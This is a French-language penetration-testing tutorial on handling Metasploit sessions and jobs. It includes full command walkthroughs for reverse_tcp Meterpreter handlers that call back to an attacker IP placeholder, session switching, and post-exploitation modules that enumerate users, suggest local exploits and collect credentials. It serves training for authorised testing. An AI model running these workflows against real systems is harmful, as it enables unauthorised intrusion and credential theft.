# Sessions et jobs

En pentest, on travaille rarement sur une seule cible a la fois. Metasploit permet de gerer plusieurs sessions d'exploitation en parallele et de lancer des modules en arriere-plan via le systeme de jobs. Maitriser cette gestion est essentiel pour rester organise quand l'engagement prend de l'ampleur.

## Pourquoi

Sur un reseau d'entreprise, on peut avoir simultanement un shell sur un serveur web, une session Meterpreter sur un poste utilisateur et un scan en cours sur un sous-reseau interne. Sans la gestion des sessions et des jobs, on perdrait le fil. Metasploit centralise tout ca dans msfconsole.

## Comment ca marche

### Sessions

Chaque exploitation reussie cree une session, un canal de communication actif entre msfconsole et la cible. Les sessions peuvent etre de type shell (simple), Meterpreter, ou VNC.

```bash
# - Lister les sessions actives
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ SRV1  10.10.14.5:4444 -> 10.10.10.20:49501
  2         shell x64/linux                                      10.10.14.5:4445 -> 10.10.10.30:38210
```

### Interagir et backgrounder

```bash
# - Interagir avec une session
msf6 > sessions -i 1
[*] Starting interaction with 1...
meterpreter >

# - Mettre la session en arriere-plan
meterpreter > background
[*] Backgrounding session 1...

# - Raccourci clavier : Ctrl+Z fait la meme chose
```

{% hint style="info" %}
Mettre une session en arriere-plan ne la ferme pas. Le canal reste actif et on peut y revenir a tout moment avec `sessions -i <id>`. C'est la methode standard pour basculer entre plusieurs cibles.
{% endhint %}

### Jobs

Les jobs sont des modules lances en arriere-plan. Un handler en ecoute, un scan auxiliaire, un exploit asynchrone : tout ce qui tourne sans bloquer le prompt est un job.

```bash
# - Lancer un exploit en tant que job (arriere-plan)
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.5:4444

# - Lister les jobs actifs
msf6 > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.5:4444

# - Tuer un job specifique
msf6 > kill 0

# - Tuer tous les jobs
msf6 > jobs -K
```

{% hint style="warning" %}
Si un handler occupe deja un port (ex: 4444) et qu'on lance un second handler sur le meme port, il echouera. Verifier les jobs actifs avec `jobs -l` avant de lancer un nouveau listener, ou utiliser un LPORT different.
{% endhint %}

## En pratique

### Workflow multi-cibles

```bash
# 1 - Lancer un handler en arriere-plan
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <IP_ATTAQUANT>
msf6 > set LPORT 4444
msf6 > exploit -j
[*] Started reverse TCP handler on <IP_ATTAQUANT>:4444

# 2 - Lancer un second handler sur un port different
msf6 > set LPORT 4445
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > exploit -j
[*] Started reverse TCP handler on <IP_ATTAQUANT>:4445

# 3 - Les sessions arrivent au fil des exploitations
[*] Meterpreter session 1 opened (...)
[*] Meterpreter session 2 opened (...)

# 4 - Basculer entre les sessions
msf6 > sessions -i 1
meterpreter > sysinfo
meterpreter > background
msf6 > sessions -i 2
```

### Modules post-exploitation sur une session existante

Les modules `post/` s'appliquent a une session active. On precise la session cible avec l'option `SESSION`.

```bash
# - Enumeration du systeme
msf6 > use post/windows/gather/enum_logged_on_users
msf6 post(windows/gather/enum_logged_on_users) > set SESSION 1
msf6 post(windows/gather/enum_logged_on_users) > run

# - Suggestion d'exploits locaux
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

# - Extraction de credentials
msf6 > use post/windows/gather/credentials/credential_collector
msf6 post(windows/gather/credentials/credential_collector) > set SESSION 1
msf6 post(windows/gather/credentials/credential_collector) > run
```

### Targets : adapter l'exploit a la cible

Certains exploits proposent plusieurs targets correspondant a des versions specifiques d'OS, de navigateur ou de service.

```bash
# - Voir les targets disponibles
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 8 on Windows 7
   4   IE 9 on Windows 7

# - Selectionner une target specifique
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 4
```

{% hint style="success" %}
En cas de doute, laisser la target sur `Automatic`. Metasploit tentera de detecter la version de la cible avant de lancer l'exploit. Si l'exploit echoue en mode automatique et que la version est connue, forcer la target manuellement peut debloquer la situation.
{% endhint %}

## Pieges et galeres

- **Session zombie** : une session peut rester listee alors que la connexion est coupee cote cible. Tenter un `sessions -i <id>` pour verifier qu'elle repond, sinon la fermer avec `sessions -k <id>`
- **Port deja utilise** : un job en arriere-plan peut bloquer un port sans qu'on s'en rende compte. Toujours verifier avec `jobs -l` avant de lancer un nouveau handler
- **Trop de sessions** : sur un gros engagement, le nombre de sessions peut devenir difficile a gerer. Nommer les sessions avec `sessions -n <nom> -i <id>` aide a s'y retrouver
- **Session qui expire** : certaines sessions (notamment les shells non-Meterpreter) peuvent expirer si elles restent inactives trop longtemps. Interagir regulierement ou migrer vers Meterpreter pour plus de stabilite

## Retour terrain

La gestion des sessions et des jobs est ce qui fait de Metasploit un outil de pentest professionnel et pas juste un lanceur d'exploits. En engagement reel, on passe beaucoup de temps a jongler entre les sessions : enumerer une cible pendant qu'un scan tourne sur une autre, lancer un module post sur une session existante tout en attendant un callback sur un handler. Le workflow `exploit -j` + `sessions -i` devient un reflexe.

## Memo express

| Commande | Usage |
|---|---|
| `sessions` | Lister les sessions actives |
| `sessions -i <id>` | Interagir avec une session |
| `sessions -k <id>` | Fermer une session |
| `sessions -K` | Fermer toutes les sessions |
| `sessions -n <nom> -i <id>` | Nommer une session |
| `background` / `Ctrl+Z` | Mettre en arriere-plan |
| `exploit -j` | Lancer en tant que job |
| `jobs -l` | Lister les jobs |
| `kill <id>` | Tuer un job |
| `jobs -K` | Tuer tous les jobs |
| `show targets` | Voir les targets de l'exploit |
| `set target <id>` | Selectionner une target |

***
